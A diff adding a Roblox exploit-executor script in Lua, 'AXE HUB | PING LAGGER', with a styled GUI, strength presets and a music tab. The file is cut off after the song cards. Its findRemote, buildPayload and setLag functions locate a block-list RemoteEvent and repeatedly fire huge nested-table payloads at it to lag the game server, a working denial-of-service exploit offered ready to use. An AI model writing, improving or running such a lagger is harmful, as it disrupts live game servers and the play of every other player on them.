@@ -1,0 +1,1269 @@
+--[[
+	AXE HUB | PING LAGGER — improved
+	Songs tab · funk 1 · GUI scale under presets
+]]
+
+local Players          = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local HttpService      = game:GetService("HttpService")
+local TweenService     = game:GetService("TweenService")
+local RunService       = game:GetService("RunService")
+local SoundService     = game:GetService("SoundService")
+
+local plr = Players.LocalPlayer
+local playerGui = plr:WaitForChild("PlayerGui")
+
+-- ═══════════════════════════════════════
+-- COLORS
+-- ═══════════════════════════════════════
+local C = {
+	bg        = Color3.fromRGB(8, 8, 10),
+	card      = Color3.fromRGB(18, 18, 24),
+	cardHover = Color3.fromRGB(28, 28, 36),
+	accent    = Color3.fromRGB(255, 200, 30),
+	accentDim = Color3.fromRGB(180, 140, 20),
+	accentLit = Color3.fromRGB(255, 235, 130),
+	glow      = Color3.fromRGB(255, 210, 60),
+	text      = Color3.fromRGB(255, 255, 255),
+	muted     = Color3.fromRGB(140, 140, 150),
+	on        = Color3.fromRGB(50, 220, 140),
+	off       = Color3.fromRGB(220, 70, 80),
+	white     = Color3.fromRGB(255, 255, 255),
+	stroke    = Color3.fromRGB(255, 200, 30),
+}
+
+local CONFIG_FILE = "AXEHUB_PingLagger_Config.json"
+local PRESETS = { ["S.Low"] = 10000, Low = 25000, Mid = 50000, High = 80000 }
+local PRESET_ORDER = { "S.Low", "Low", "Mid", "High" }
+
+local cfg = {
+	power = 50000,
+	preset = "Mid",
+	interval = 0.125,
+	keybind = "F",
+	autoBrainrot = true,
+	version = 2,
+	guiScale = 1,
+	songOn = false,
+	compactMode = false,
+}
+
+local function resolveKey(name)
+	if not name or name == "" or name == "None" then return nil end
+	local ok, val = pcall(function() return Enum.KeyCode[name] end)
+	return (ok and val) or nil
+end
+
+local function saveConfig()
+	local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
+	if ok and encoded and writefile then pcall(writefile, CONFIG_FILE, encoded) end
+end
+
+local function loadConfig()
+	if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
+	local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
+	if not ok or type(data) ~= "table" then return end
+	cfg.power = tonumber(data.power) or cfg.power
+	cfg.preset = type(data.preset) == "string" and data.preset or cfg.preset
+	cfg.interval = tonumber(data.interval) or cfg.interval
+	cfg.keybind = type(data.keybind) == "string" and data.keybind or cfg.keybind
+	cfg.autoBrainrot = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or cfg.autoBrainrot
+	cfg.version = tonumber(data.version) or 2
+	cfg.guiScale = tonumber(data.guiScale) or 1
+	cfg.songOn = type(data.songOn) == "boolean" and data.songOn or false
+	cfg.compactMode = type(data.compactMode) == "boolean" and data.compactMode or false
+	if PRESETS[cfg.preset] then cfg.power = PRESETS[cfg.preset] end
+end
+loadConfig()
+
+local active, listeningFor, remote, uiLocked, settingsOpen = false, false, nil, false, false
+local currentTab = "main"
+
+-- ═══════════════════════════════════════
+-- REMOTE / LAG LOGIC
+-- ═══════════════════════════════════════
+local function findRemote()
+	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+	if not rrs then return nil end
+	local rem
+	for _, name in ipairs({ "SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList" }) do
+		local r = rrs:FindFirstChild(name)
+		if r and r:IsA("RemoteEvent") then rem = r break end
+	end
+	if not rem then
+		for _, c in ipairs(rrs:GetChildren()) do
+			if c:IsA("RemoteEvent") and c.Name:find("Block") then rem = c break end
+		end
+	end
+	return rem
+end
+remote = findRemote()
+
+local function buildPayload(power)
+	local version = cfg.version or 2
+	local safePower = tonumber(power) or 50000
+	if safePower < 1 then safePower = 1 end
+
+	if version == 1 then
+		local main, chunk = {}, {}
+		for _ = 1, 100 do table.insert(chunk, {}) end
+		local maxRep = math.min(math.floor(safePower / 100), 10000)
+		for _ = 1, maxRep do table.insert(main, chunk) end
+		return main
+	else
+		-- V2 / V3 nested chain
+		local main = {}
+		local nested = { {} }
+		local current = nested[1]
+		for _ = 1, 186 do
+			local n = {}
+			table.insert(current, n)
+			current = n
+		end
+		local maxRep = math.min(math.floor(safePower / 188), 10000)
+		if maxRep < 1 then maxRep = 1 end
+		for _ = 1, maxRep do table.insert(main, nested) end
+		return main
+	end
+end
+
+local loopTask = nil
+local function setLag(state)
+	active = state
+	if active then
+		if not remote or not remote.Parent then remote = findRemote() end
+		if loopTask then pcall(task.cancel, loopTask) end
+		loopTask = task.spawn(function()
+			local currentDelay = cfg.interval
+			while active do
+				if not remote or not remote.Parent then
+					remote = findRemote()
+					if not remote then task.wait(0.5) continue end
+				end
+				local payload = buildPayload(cfg.power)
+				local ok = pcall(function() remote:FireServer(payload) end)
+				if not ok then
+					currentDelay = math.min(currentDelay * 1.5, 0.5)
+				else
+					currentDelay = math.max(currentDelay * 0.995, 0.05)
+				end
+				task.wait(currentDelay)
+			end
+		end)
+	else
+		if loopTask then pcall(task.cancel, loopTask) end
+		loopTask = nil
+	end
+end
+
+-- ═══════════════════════════════════════
+-- SONGS
+-- ═══════════════════════════════════════
+local SONGS = {
+	{ name = "funk 1", url = "https://files.catbox.moe/mfcis6.mp3", file = "AXEHUB_funk1.mp3", soundName = "AXEHUB_Funk1" },
+	{ name = "funk 2", url = "https://files.catbox.moe/paz5vs.mp3", file = "AXEHUB_funk2.mp3", soundName = "AXEHUB_Funk2" },
+}
+
+local songSounds = {} -- [index] = Sound
+local songPlaying = {} -- [index] = bool
+
+local function ensureSongAt(i)
+	local meta = SONGS[i]
+	if not meta then return nil end
+	if songSounds[i] and songSounds[i].Parent then return songSounds[i] end
+	local id = meta.url
+	pcall(function()
+		if writefile and isfile and getcustomasset then
+			if not isfile(meta.file) then
+				local data = game:HttpGet(meta.url)
+				if data and #data > 100 then writefile(meta.file, data) end
+			end
+			if isfile(meta.file) then
+				id = getcustomasset(meta.file)
+			end
+		end
+	end)
+	local s = Instance.new("Sound")
+	s.Name = meta.soundName
+	s.SoundId = id
+	s.Volume = 0.65
+	s.Looped = true
+	s.Parent = SoundService
+	songSounds[i] = s
+	return s
+end
+
+local function setSongAt(i, on)
+	songPlaying[i] = on and true or false
+	local s = ensureSongAt(i)
+	if not s then return end
+	if on then
+		pcall(function() s:Play() end)
+	else
+		pcall(function() s:Stop() end)
+	end
+	-- cfg.songOn = any playing
+	local any = false
+	for _, v in pairs(songPlaying) do if v then any = true break end end
+	cfg.songOn = any
+	saveConfig()
+end
+
+local function stopAllSongs()
+	for i = 1, #SONGS do
+		songPlaying[i] = false
+		if songSounds[i] then pcall(function() songSounds[i]:Stop() end) end
+	end
+	cfg.songOn = false
+	pcall(function()
+		for _, s in ipairs(SoundService:GetChildren()) do
+			if s:IsA("Sound") then
+				local n = s.Name:lower()
+				if n:find("axe") or n:find("funk") then
+					pcall(function() s:Stop() end)
+				end
+			end
+		end
+	end)
+	saveConfig()
+end
+
+-- ═══════════════════════════════════════
+-- UI HELPERS
+-- ═══════════════════════════════════════
+local function corner(parent, r)
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, r or 8)
+	c.Parent = parent
+	return c
+end
+
+local function stroke(parent, color, thick, trans)
+	local s = Instance.new("UIStroke")
+	s.Color = color or C.stroke
+	s.Thickness = thick or 1.5
+	s.Transparency = trans or 0.4
+	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	s.Parent = parent
+	return s
+end
+
+local function makeDraggable(target, lockedCheck)
+	local dragging, dragStart, startAbs
+	target.InputBegan:Connect(function(input)
+		if lockedCheck and lockedCheck() then return end
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startAbs = target.AbsolutePosition
+		end
+	end)
+	UserInputService.InputChanged:Connect(function(input)
+		if not dragging then return end
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			local delta = input.Position - dragStart
+			local vp = workspace.CurrentCamera.ViewportSize
+			local nx = math.clamp(startAbs.X + delta.X, -target.AbsoluteSize.X + 40, vp.X - 40)
+			local ny = math.clamp(startAbs.Y + delta.Y, 0, vp.Y - target.AbsoluteSize.Y)
+			target.Position = UDim2.new(0, nx, 0, ny)
+		end
+	end)
+	UserInputService.InputEnded:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = false
+		end
+	end)
+end
+
+-- ═══════════════════════════════════════
+-- SCREEN GUI
+-- ═══════════════════════════════════════
+pcall(function()
+	local old = game:GetService("CoreGui"):FindFirstChild("AXEHUB_PingLagger")
+	if old then old:Destroy() end
+end)
+pcall(function()
+	local old = playerGui:FindFirstChild("AXEHUB_PingLagger")
+	if old then old:Destroy() end
+end)
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AXEHUB_PingLagger"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.IgnoreGuiInset = true
+pcall(function() screenGui.Parent = game:GetService("CoreGui") end)
+if not screenGui.Parent then screenGui.Parent = playerGui end
+
+-- ═══════════════════════════════════════
+-- INTRO / PLATFORM SELECT
+-- ═══════════════════════════════════════
+local modeSelector = Instance.new("Frame")
+modeSelector.Size = UDim2.new(1, 0, 1, 0)
+modeSelector.BackgroundColor3 = C.bg
+modeSelector.BorderSizePixel = 0
+modeSelector.ZIndex = 100
+modeSelector.Parent = screenGui
+
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 14)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 8)),
+}
+gradient.Rotation = 90
+gradient.Parent = modeSelector
+
+-- cosmic particles
+local cosmicContainer = Instance.new("Frame")
+cosmicContainer.Size = UDim2.new(1, 0, 1, 0)
+cosmicContainer.BackgroundTransparency = 1
+cosmicContainer.ClipsDescendants = true
+cosmicContainer.ZIndex = 101
+cosmicContainer.Parent = modeSelector
+
+local cosmicPool = {}
+for _ = 1, 50 do
+	local s = Instance.new("Frame")
+	s.Size = UDim2.new(0, 0, 0, 0)
+	s.BackgroundColor3 = C.accentLit
+	s.BorderSizePixel = 0
+	s.BackgroundTransparency = 1
+	s.ZIndex = 102
+	s.Parent = cosmicContainer
+	corner(s, 50)
+	stroke(s, C.glow, 1, 0.2)
+	table.insert(cosmicPool, s)
+end
+
+local function emitCosmic()
+	local s = table.remove(cosmicPool, 1)
+	if not s then return end
+	local sx = math.random(0, 100)
+	local size = math.random(3, 10)
+	s.Position = UDim2.new(sx / 100, 0, 0, -16)
+	s.Size = UDim2.new(0, size, 0, size)
+	s.BackgroundTransparency = 0
+	local st = s:FindFirstChildOfClass("UIStroke")
+	if st then st.Transparency = 0.15 end
+	local duration = math.random(18, 36) / 10
+	TweenService:Create(s, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
+		Position = UDim2.new((sx + math.random(-8, 8)) / 100, 0, 1.05, 0),
+		BackgroundTransparency = 1,
+	}):Play()
+	if st then
+		TweenService:Create(st, TweenInfo.new(duration, Enum.EasingStyle.Linear), { Transparency = 1 }):Play()
+	end
+	task.delay(duration, function() table.insert(cosmicPool, s) end)
+end
+
+task.spawn(function()
+	while modeSelector and modeSelector.Parent and modeSelector.Visible do
+		task.wait(0.09)
+		if modeSelector.Visible then emitCosmic() end
+	end
+end)
+
+local logoText = Instance.new("TextLabel")
+logoText.Size = UDim2.new(1, 0, 0, 56)
+logoText.Position = UDim2.new(0, 0, 0.24, 0)
+logoText.BackgroundTransparency = 1
+logoText.Text = "AXE HUB"
+logoText.TextColor3 = C.accent
+logoText.TextSize = 44
+logoText.Font = Enum.Font.GothamBlack
+logoText.TextXAlignment = Enum.TextXAlignment.Center
+logoText.ZIndex = 110
+logoText.Parent = modeSelector
+local logoStroke = stroke(logoText, C.glow, 2, 0.3)
+logoStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+
+task.spawn(function()
+	while logoText and logoText.Parent do
+		TweenService:Create(logoText, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0.12 }):Play()
+		TweenService:Create(logoStroke, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Transparency = 0.1 }):Play()
+		task.wait(1.4)
+		TweenService:Create(logoText, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0 }):Play()
+		TweenService:Create(logoStroke, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Transparency = 0.35 }):Play()
+		task.wait(1.4)
+	end
+end)
+
+local subTitle = Instance.new("TextLabel")
+subTitle.Size = UDim2.new(1, 0, 0, 28)
+subTitle.Position = UDim2.new(0, 0, 0.32, 0)
+subTitle.BackgroundTransparency = 1
+subTitle.Text = "SELECT YOUR PLATFORM"
+subTitle.TextColor3 = C.muted
+subTitle.TextSize = 13
+subTitle.Font = Enum.Font.GothamBold
+subTitle.TextXAlignment = Enum.TextXAlignment.Center
+subTitle.ZIndex = 110
+subTitle.Parent = modeSelector
+
+local btnFrame = Instance.new("Frame")
+btnFrame.Size = UDim2.new(0, 340, 0, 60)
+btnFrame.Position = UDim2.new(0.5, -170, 0.44, 0)
+btnFrame.BackgroundTransparency = 1
+btnFrame.ZIndex = 110
+btnFrame.Parent = modeSelector
+
+local function makePlatformBtn(text, xOffset)
+	local b = Instance.new("TextButton")
+	b.Size = UDim2.new(0, 150, 0, 52)
+	b.Position = UDim2.new(0.5, xOffset, 0.5, 0)
+	b.AnchorPoint = Vector2.new(0.5, 0.5)
+	b.BackgroundColor3 = C.card
+	b.Text = text
+	b.TextColor3 = C.accent
+	b.TextSize = 15
+	b.Font = Enum.Font.GothamBold
+	b.ZIndex = 111
+	b.BackgroundTransparency = 1
+	b.TextTransparency = 1
+	b.Parent = btnFrame
+	local sc = Instance.new("UIScale", b)
+	sc.Scale = 0.8
+	corner(b, 12)
+	stroke(b, C.stroke, 1.5, 0.45)
+	return b, sc
+end
+
+local mobBtn, mobScale = makePlatformBtn("📱 Mobile", -80)
+local pcBtn, pcScale = makePlatformBtn("💻 PC Control", 80)
+
+task.spawn(function()
+	task.wait(0.25)
+	TweenService:Create(mobBtn, TweenInfo.new(0.55, Enum.EasingStyle.Back), { BackgroundTransparency = 0, TextTransparency = 0 }):Play()
+	TweenService:Create(mobScale, TweenInfo.new(0.55, Enum.EasingStyle.Back), { Scale = 1 }):Play()
+	task.wait(0.2)
+	TweenService:Create(pcBtn, TweenInfo.new(0.55, Enum.EasingStyle.Back), { BackgroundTransparency = 0, TextTransparency = 0 }):Play()
+	TweenService:Create(pcScale, TweenInfo.new(0.55, Enum.EasingStyle.Back), { Scale = 1 }):Play()
+end)
+
+-- ═══════════════════════════════════════
+-- MAIN WINDOW
+-- ═══════════════════════════════════════
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 268)
+frame.Position = UDim2.new(0.5, -150, 0.5, -134)
+frame.BackgroundColor3 = C.card
+frame.BackgroundTransparency = 0.12
+frame.BorderSizePixel = 0
+frame.Visible = false
+frame.ZIndex = 50
+frame.Parent = screenGui
+corner(frame, 14)
+stroke(frame, C.accent, 1.8, 0.28)
+
+local mainScale = Instance.new("UIScale", frame)
+mainScale.Scale = math.clamp(cfg.guiScale or 1, 0.7, 1.4)
+
+local topBar = Instance.new("Frame")
+topBar.Size = UDim2.new(1, 0, 0, 38)
+topBar.BackgroundColor3 = C.bg
+topBar.BackgroundTransparency = 0.25
+topBar.BorderSizePixel = 0
+topBar.Parent = frame
+corner(topBar, 14)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -140, 1, 0)
+title.Position = UDim2.new(0, 12, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "AXE HUB | PING LAGGER"
+title.TextColor3 = C.accentLit
+title.TextSize = 13
+title.Font = Enum.Font.GothamBlack
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.ZIndex = 55
+title.Parent = topBar
+
+local lockBtn = Instance.new("TextButton")
+lockBtn.Size = UDim2.new(0, 26, 0, 26)
+lockBtn.Position = UDim2.new(1, -32, 0, 6)
+lockBtn.BackgroundColor3 = C.card
+lockBtn.Text = "🔓"
+lockBtn.TextColor3 = C.white
+lockBtn.TextSize = 12
+lockBtn.Font = Enum.Font.GothamBold
+lockBtn.ZIndex = 56
+lockBtn.Parent = topBar
+corner(lockBtn, 6)
+stroke(lockBtn, C.stroke, 1, 0.5)
+
+local gearBtn = Instance.new("TextButton")
+gearBtn.Size = UDim2.new(0, 26, 0, 26)
+gearBtn.Position = UDim2.new(1, -62, 0, 6)
+gearBtn.BackgroundColor3 = C.card
+gearBtn.Text = "⚙"
+gearBtn.TextColor3 = C.accent
+gearBtn.TextSize = 14
+gearBtn.Font = Enum.Font.GothamBold
+gearBtn.ZIndex = 56
+gearBtn.Parent = topBar
+corner(gearBtn, 6)
+stroke(gearBtn, C.stroke, 1, 0.5)
+
+-- compact toggle (screenshot layout ↔ full)
+local compactMode = false
+local compactBtn = Instance.new("TextButton")
+compactBtn.Size = UDim2.new(0, 26, 0, 26)
+compactBtn.Position = UDim2.new(1, -92, 0, 6)
+compactBtn.BackgroundColor3 = C.card
+compactBtn.Text = "−"
+compactBtn.TextColor3 = C.accentLit
+compactBtn.TextSize = 18
+compactBtn.Font = Enum.Font.GothamBlack
+compactBtn.ZIndex = 56
+compactBtn.Parent = topBar
+corner(compactBtn, 6)
+stroke(compactBtn, C.stroke, 1, 0.5)
+
+-- TAB BAR (Main / Songs)
+local tabBar = Instance.new("Frame")
+tabBar.Size = UDim2.new(1, -16, 0, 30)
+tabBar.Position = UDim2.new(0, 8, 0, 42)
+tabBar.BackgroundTransparency = 1
+tabBar.ZIndex = 55
+tabBar.Parent = frame
+
+local tabMain = Instance.new("TextButton")
+tabMain.Size = UDim2.new(0.5, -4, 1, 0)
+tabMain.Position = UDim2.new(0, 0, 0, 0)
+tabMain.BackgroundColor3 = C.accent
+tabMain.Text = "MAIN"
+tabMain.TextColor3 = C.bg
+tabMain.TextSize = 12
+tabMain.Font = Enum.Font.GothamBlack
+tabMain.ZIndex = 56
+tabMain.Parent = tabBar
+corner(tabMain, 8)
+
+local tabSongs = Instance.new("TextButton")
+tabSongs.Size = UDim2.new(0.5, -4, 1, 0)
+tabSongs.Position = UDim2.new(0.5, 4, 0, 0)
+tabSongs.BackgroundColor3 = C.bg
+tabSongs.Text = "SONGS"
+tabSongs.TextColor3 = C.muted
+tabSongs.TextSize = 12
+tabSongs.Font = Enum.Font.GothamBlack
+tabSongs.ZIndex = 56
+tabSongs.Parent = tabBar
+corner(tabSongs, 8)
+stroke(tabSongs, C.stroke, 1, 0.55)
+
+-- MAIN PAGE
+local mainPage = Instance.new("Frame")
+mainPage.Size = UDim2.new(1, -16, 1, -80)
+mainPage.Position = UDim2.new(0, 8, 0, 78)
+mainPage.BackgroundTransparency = 1
+mainPage.ZIndex = 55
+mainPage.Parent = frame
+
+local lagBtn = Instance.new("TextButton")
+lagBtn.Size = UDim2.new(1, 0, 0, 42)
+lagBtn.Position = UDim2.new(0, 0, 0, 0)
+lagBtn.BackgroundColor3 = C.bg
+lagBtn.BorderSizePixel = 0
+lagBtn.Text = "ACTIVATE"
+lagBtn.TextColor3 = C.accent
+lagBtn.TextSize = 16
+lagBtn.Font = Enum.Font.GothamBlack
+lagBtn.ZIndex = 56
+lagBtn.Parent = mainPage
+corner(lagBtn, 10)
+stroke(lagBtn, C.accent, 1.5, 0.28)
+
+-- presets
+local presetRow = Instance.new("Frame")
+presetRow.Size = UDim2.new(1, 0, 0, 32)
+presetRow.Position = UDim2.new(0, 0, 0, 50)
+presetRow.BackgroundTransparency = 1
+presetRow.ZIndex = 55
+presetRow.Parent = mainPage
+
+local presetLayout = Instance.new("UIListLayout")
+presetLayout.FillDirection = Enum.FillDirection.Horizontal
+presetLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+presetLayout.Padding = UDim.new(0, 6)
+presetLayout.SortOrder = Enum.SortOrder.LayoutOrder
+presetLayout.Parent = presetRow
+
+local presetButtons = {}
+local function updatePresetVisuals()
+	for name, btn in pairs(presetButtons) do
+		local selected = (cfg.preset == name)
+		btn.BackgroundColor3 = selected and C.accent or C.bg
+		btn.TextColor3 = selected and C.bg or C.muted
+		local s = btn:FindFirstChildOfClass("UIStroke")
+		if s then s.Transparency = selected and 0.1 or 0.55 end
+	end
+end
+
+local function setPreset(name)
+	if not PRESETS[name] then return end
+	cfg.preset = name
+	cfg.power = PRESETS[name]
+	if active then setLag(false); setLag(true) end
+	saveConfig()
+	updatePresetVisuals()
+end
+
+for i, name in ipairs(PRESET_ORDER) do
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(0, 62, 0, 28)
+	btn.BackgroundColor3 = C.bg
+	btn.BorderSizePixel = 0
+	btn.Text = name
+	btn.TextColor3 = C.muted
+	btn.TextSize = 11
+	btn.Font = Enum.Font.GothamBold
+	btn.LayoutOrder = i
+	btn.ZIndex = 56
+	btn.Parent = presetRow
+	corner(btn, 8)
+	stroke(btn, C.stroke, 1, 0.55)
+	btn.MouseButton1Click:Connect(function() setPreset(name) end)
+	presetButtons[name] = btn
+end
+updatePresetVisuals()
+
+-- GUI SIZE under presets
+local scaleRow = Instance.new("Frame")
+scaleRow.Size = UDim2.new(1, 0, 0, 36)
+scaleRow.Position = UDim2.new(0, 0, 0, 90)
+scaleRow.BackgroundTransparency = 1
+scaleRow.ZIndex = 55
+scaleRow.Parent = mainPage
+
+local scaleLbl = Instance.new("TextLabel")
+scaleLbl.Size = UDim2.new(0, 70, 1, 0)
+scaleLbl.BackgroundTransparency = 1
+scaleLbl.Text = "GUI SIZE"
+scaleLbl.TextColor3 = C.accentLit
+scaleLbl.TextSize = 11
+scaleLbl.Font = Enum.Font.GothamBold
+scaleLbl.TextXAlignment = Enum.TextXAlignment.Left
+scaleLbl.ZIndex = 56
+scaleLbl.Parent = scaleRow
+
+local scaleTrack = Instance.new("Frame")
+scaleTrack.Size = UDim2.new(1, -120, 0, 14)
+scaleTrack.Position = UDim2.new(0, 74, 0.5, -7)
+scaleTrack.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
+scaleTrack.BorderSizePixel = 0
+scaleTrack.ZIndex = 56
+scaleTrack.Active = true
+scaleTrack.Parent = scaleRow
+corner(scaleTrack, 7)
+
+local scaleFill = Instance.new("Frame")
+scaleFill.Size = UDim2.new(math.clamp((cfg.guiScale - 0.7) / 0.7, 0, 1), 0, 1, 0)
+scaleFill.BackgroundColor3 = C.accent
+scaleFill.BorderSizePixel = 0
+scaleFill.ZIndex = 57
+scaleFill.Parent = scaleTrack
+corner(scaleFill, 7)
+
+local scaleKnob = Instance.new("Frame")
+scaleKnob.Size = UDim2.new(0, 20, 0, 20)
+scaleKnob.AnchorPoint = Vector2.new(0.5, 0.5)
+scaleKnob.Position = UDim2.new(math.clamp((cfg.guiScale - 0.7) / 0.7, 0, 1), 0, 0.5, 0)
+scaleKnob.BackgroundColor3 = C.white
+scaleKnob.BorderSizePixel = 0
+scaleKnob.ZIndex = 58
+scaleKnob.Parent = scaleTrack
+corner(scaleKnob, 10)
+stroke(scaleKnob, C.accent, 1.5, 0.2)
+
+-- large invisible hit area for easy drag
+local scaleHit = Instance.new("TextButton")
+scaleHit.Size = UDim2.new(1, 16, 0, 36)
+scaleHit.Position = UDim2.new(0, -8, 0.5, -18)
+scaleHit.BackgroundTransparency = 1
+scaleHit.Text = ""
+scaleHit.ZIndex = 59
+scaleHit.Parent = scaleTrack
+
+local scaleVal = Instance.new("TextLabel")
+scaleVal.Size = UDim2.new(0, 40, 1, 0)
+scaleVal.Position = UDim2.new(1, -40, 0, 0)
+scaleVal.BackgroundTransparency = 1
+scaleVal.Text = string.format("%.0f%%", (cfg.guiScale or 1) * 100)
+scaleVal.TextColor3 = C.muted
+scaleVal.TextSize = 11
+scaleVal.Font = Enum.Font.GothamBold
+scaleVal.TextXAlignment = Enum.TextXAlignment.Right
+scaleVal.ZIndex = 56
+scaleVal.Parent = scaleRow
+
+local function refreshCompactUI()
+	local compact = compactMode == true
+	if scaleRow then scaleRow.Visible = not compact end
+	if tabBar then tabBar.Visible = not compact end
+	for _, name in ipairs(PRESET_ORDER) do
+		if presetButtons[name] then presetButtons[name].Visible = true end
+	end
+	lagBtn.Visible = true
+	presetRow.Visible = true
+	if compact then
+		-- layout like screenshot: title + ACTIVATE + presets only
+		frame.Size = UDim2.new(0, 300, 0, 128)
+		mainPage.Position = UDim2.new(0, 8, 0, 42)
+		mainPage.Size = UDim2.new(1, -16, 1, -48)
+		lagBtn.Size = UDim2.new(1, 0, 0, 36)
+		presetRow.Position = UDim2.new(0, 0, 0, 44)
+		if compactBtn then compactBtn.Text = "+" end
+	else
+		frame.Size = UDim2.new(0, 300, 0, 268)
+		mainPage.Position = UDim2.new(0, 8, 0, 78)
+		mainPage.Size = UDim2.new(1, -16, 1, -80)
+		lagBtn.Size = UDim2.new(1, 0, 0, 42)
+		presetRow.Position = UDim2.new(0, 0, 0, 50)
+		if compactBtn then compactBtn.Text = "−" end
+	end
+end
+
+local function applyGuiScale(v)
+	v = math.clamp(tonumber(v) or 1, 0.7, 1.4)
+	cfg.guiScale = v
+	mainScale.Scale = v
+	local t = math.clamp((v - 0.7) / 0.7, 0, 1)
+	scaleFill.Size = UDim2.new(t, 0, 1, 0)
+	if scaleKnob then scaleKnob.Position = UDim2.new(t, 0, 0.5, 0) end
+	scaleVal.Text = string.format("%.0f%%", v * 100)
+	saveConfig()
+end
+
+local draggingScale = false
+local function scaleFromInput(x)
+	local abs = scaleTrack.AbsolutePosition.X
+	local w = scaleTrack.AbsoluteSize.X
+	if w < 1 then return end
+	local t = math.clamp((x - abs) / w, 0, 1)
+	applyGuiScale(0.7 + t * 0.7)
+end
+
+local function bindScaleDrag(obj)
+	obj.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			draggingScale = true
+			scaleFromInput(input.Position.X)
+		end
+	end)
+end
+bindScaleDrag(scaleHit)
+bindScaleDrag(scaleTrack)
+bindScaleDrag(scaleKnob)
+UserInputService.InputChanged:Connect(function(input)
+	if not draggingScale then return end
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		scaleFromInput(input.Position.X)
+	end
+end)
+UserInputService.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		draggingScale = false
+	end
+end)
+
+-- quick scale buttons
+
+local statusLbl = Instance.new("TextLabel")
+statusLbl.Visible = false
+statusLbl.Size = UDim2.new(0, 0, 0, 0)
+statusLbl.Parent = mainPage
+
+-- SONGS PAGE
+local songsPage = Instance.new("Frame")
+songsPage.Size = UDim2.new(1, -16, 1, -80)
+songsPage.Position = UDim2.new(0, 8, 0, 78)
+songsPage.BackgroundTransparency = 1
+songsPage.Visible = false
+songsPage.ZIndex = 55
+songsPage.Parent = frame
+
+local songToggleBtns = {}
+
+local function refreshSongToggleAt(i)
+	local btn = songToggleBtns[i]
+	if not btn then return end
+	local on = songPlaying[i] == true
+	btn.Text = on and "ON" or "OFF"
+	btn.BackgroundColor3 = on and C.on or C.card
+	btn.TextColor3 = on and C.white or C.accent
+end
+
+local function refreshAllSongToggles()
+	for i = 1, #SONGS do refreshSongToggleAt(i) end
+end
+
+for i, meta in ipairs(SONGS) do
+	local y = (i - 1) * 78
+	local songCard = Instance.new("Frame")
+	songCard.Size = UDim2.new(1, 0, 0, 70)
+	songCard.Position = UDim2.new(0, 0, 0, y)
+	songCard.BackgroundColor3 = C.bg
+	songCard.BorderSizePixel = 0
+	songCard.ZIndex = 56
+	songCard.Parent = songsPage
+	corner(songCard, 12)
+	stroke(songCard, C.stroke, 1.3, 0.4)
+
+	local songTitle = Instance.new("TextLabel")
+	songTitle.Size = UDim2.new(1, -20, 0, 20)
+	songTitle.Position = UDim2.new(0, 12, 0, 8)
+	songTitle.BackgroundTransparency = 1
+	songTitle.Text = meta.name
+	songTitle.TextColor3 = C.accentLit
+	songTitle.TextSize = 14
+	songTitle.Font = Enum.Font.GothamBlack
+	songTitle.TextXAlignment = Enum.TextXAlignment.Left
+	songTitle.ZIndex = 57
+	songTitle.Parent = songCard
+
+	local songSub = Instance.new("TextLabel")
+	songSub.Size = UDim2.new(1, -20, 0, 14)
+	songSub.Position = UDim2.new(0, 12, 0, 28)
+	songSub.BackgroundTransparency = 1
+	songSub.Text = "loop"
+	songSub.TextColor3 = C.muted
+	songSub.TextSize = 11
+	songSub.Font = Enum.Font.Gotham
+	songSub.TextXAlignment = Enum.TextXAlignment.Left
+	songSub.ZIndex = 57
+	songSub.Parent = songCard
+
+	local songToggle = Instance.new("TextButton")
+	songToggle.Size = UDim2.new(0, 72, 0, 24)
+	songToggle.Position = UDim2.new(0, 12, 1, -30)
+	songToggle.BackgroundColor3 = C.card
+	songToggle.Text = "OFF"
+	songToggle.TextColor3 = C.accent
+	songToggle.TextSize = 11
+	songToggle.Font = Enum.Font.GothamBlack
+	songToggle.ZIndex = 57
+	songToggle.Parent = songCard
+	corner(songToggle, 7)
+	stroke(songToggle, C.stroke, 1, 0.4)
+	songToggleBtns[i] = songToggle
+	songToggle.MouseButton1Click:Connect(function()
+		setSongAt(i, not songPlaying[i])
+		refreshSongToggleAt(i)
+	end)
+end
+
